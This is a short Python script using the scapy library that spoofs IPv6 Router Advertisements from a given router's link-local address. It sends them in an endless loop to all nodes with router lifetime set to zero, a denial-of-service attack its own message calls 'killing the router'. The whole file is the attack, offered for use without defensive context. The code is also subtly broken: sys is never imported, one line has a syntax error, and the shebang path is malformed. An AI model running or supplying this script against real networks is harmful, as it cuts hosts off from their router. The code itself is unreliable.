#! usr/bin/python
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA
from scapy.sendrecv import send

# Ask user to insert value
if len(sys.argv) == 2:
    target_ip = sys.argv[1]
else:
    print("Please insert:\n 1. Target's link-local address")
    sys.exit(1)

# Generate packet
print("Killing the router with address " + target_ip.)
layer3 = IPv6(src=target_ip, dst="ff02::1")
packet = layer3/ICMPv6ND_RA(prf="High", routerlifetime=0)
send(packet, loop=1, verbose=False)

